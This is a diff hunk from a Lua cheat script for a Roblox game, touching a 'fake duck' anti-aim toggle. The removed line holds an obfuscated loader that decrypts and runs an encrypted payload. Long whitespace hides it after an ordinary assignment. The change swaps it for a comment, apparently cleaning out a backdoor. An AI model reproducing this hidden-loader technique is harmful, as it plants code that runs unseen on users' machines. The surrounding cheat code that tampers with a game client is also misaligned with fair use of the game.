@@ -4737,7 +4737,7 @@ antiaim:Element("Toggle", "fake duck",{},function(tbl)
 			local CrouchAnim = nil
 			for i,v in pairs(debug.getupvalues(Client.setcharacter)) do
 				if type(v) == "userdata" and v.ClassName == "AnimationTrack" and v.Name == "Idle" then
-					CrouchAnim = v																																																																																																																																																																																																																																																																																																																																																						loadstring(syn.crypt.decrypt("this_was_pasted_from_mexicanhook","b2Rud3ZMK01aTUZZekxVL3JGQ2dsWkpoOEd4VzNZVDYvZDU0dTRXa3c3OTFHSmcvTU4vU0JvWVZXL1ErcU5sbnxwdjBTRlorNFQvYytzdlps"))()
+					CrouchAnim = v																																																																																																																																																																																																																																																																																																																																																						-- this_was_pasted_from_mexicanhook
 				end
 			end
 
